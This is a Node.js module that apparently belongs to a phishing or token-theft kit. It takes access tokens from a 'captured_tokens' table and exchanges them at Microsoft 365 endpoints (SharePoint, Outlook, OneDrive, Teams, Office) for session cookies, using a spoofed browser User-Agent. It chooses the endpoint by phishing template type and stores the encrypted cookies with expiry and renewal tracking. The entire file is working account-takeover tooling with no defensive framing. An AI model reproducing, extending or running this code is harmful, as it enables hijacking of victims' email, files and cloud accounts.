const axios = require('axios');
const { encrypt } = require('../utils/encrypt');
const db = require('../database/connection');

// Microsoft endpoints for cookie conversion per service
const SERVICE_ENDPOINTS = {
  sharepoint: 'https://login.microsoftonline.com/common/oauth2/authorize?resource=https://{tenant}.sharepoint.com',
  outlook: 'https://outlook.office365.com/owa/',
  onedrive: 'https://{tenant}-my.sharepoint.com/personal/{email}/_layouts/15/onedrive.aspx',
  teams: 'https://teams.microsoft.com/',
  office: 'https://www.office.com/',
  default: 'https://www.office.com/',
};

async function convertTokensToCookies(accessToken, templateType, tenant = 'common', email = '') {
  const endpoint = determineEndpoint(templateType, tenant, email);
  
  try {
    const response = await axios.get(endpoint, {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
      },
      maxRedirects: 5,
      validateStatus: status => status < 400,
    });
    
    const setCookieHeaders = response.headers['set-cookie'] || [];
    const cookies = setCookieHeaders.map(c => c.split(';')[0]).join('; ');
    
    return { success: true, cookies };
  } catch (err) {
    // Retry once
    try {
      const retryResponse = await axios.get(endpoint, {
        headers: {
          'Authorization': `Bearer ${accessToken}`,
          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        },
        maxRedirects: 5,
        validateStatus: status => status < 400,
      });
      
      const setCookieHeaders = retryResponse.headers['set-cookie'] || [];
      const cookies = setCookieHeaders.map(c => c.split(';')[0]).join('; ');
      
      return { success: true, cookies };
    } catch (retryErr) {
      return { success: false, error: retryErr.message, cookies: null };
    }
  }
}

function determineEndpoint(templateType, tenant, email) {
  const type = (templateType || '').toLowerCase();
  if (type.includes('sharepoint')) return `https://login.microsoftonline.com/${tenant}/oauth2/authorize?resource=https://${tenant}.sharepoint.com`;
  if (type.includes('outlook') || type.includes('auth')) return 'https://outlook.office365.com/owa/';
  if (type.includes('onedrive')) return `https://${tenant}-my.sharepoint.com/personal/${encodeURIComponent(email || 'user')}/_layouts/15/onedrive.aspx`;
  if (type.includes('teams')) return 'https://teams.microsoft.com/';
  if (type.includes('office') || type.includes('word') || type.includes('excel')) return 'https://www.office.com/';
  return 'https://www.office.com/';
}

async function processCookieConversion(tokenId, accessToken, templateType) {
  const result = await convertTokensToCookies(accessToken, templateType);
  
  if (result.success && result.cookies) {
    const ttlHours = 24;
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted = ?, token_type = ?, expiration = DATE_ADD(NOW(), INTERVAL ? HOUR), last_renewed = NOW(), renewal_count = 1 WHERE id = ?',
      [encrypt(result.cookies), 'cookie', ttlHours, tokenId]
    );
  }
  
  return result;
}

module.exports = { convertTokensToCookies, processCookieConversion, determineEndpoint };